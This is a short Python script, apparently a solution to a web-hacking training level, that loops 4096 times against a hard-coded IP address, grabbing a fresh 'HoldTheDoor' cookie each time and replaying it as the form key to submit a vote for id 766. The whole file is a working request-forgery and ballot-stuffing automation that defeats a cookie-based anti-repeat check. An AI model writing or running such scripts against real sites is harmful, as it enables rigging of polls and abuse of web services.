#!/usr/bin/python3
import requests


for i in range(4096):
    r =  requests.get("http://158.69.76.135/level1.php")
    galleta = r.cookies['HoldTheDoor']


    payload = {'id': 766, 'holdthedoor': 'Submit', 'key': galleta}
    r1 = requests.post("http://158.69.76.135/level1.php", data=payload, cookies={'HoldTheDoor': galleta})
